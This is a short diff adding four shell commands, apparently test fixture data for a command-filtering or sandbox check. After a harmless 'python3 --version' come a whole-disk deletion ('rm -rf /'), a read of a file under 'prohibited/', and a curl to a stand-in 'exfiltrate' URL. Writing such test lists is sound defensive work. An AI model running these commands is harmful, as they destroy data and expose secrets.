@@ -1,0 +1,4 @@
+python3 --version
+rm -rf /
+cat prohibited/secret.txt
+curl https://example.invalid/exfiltrate
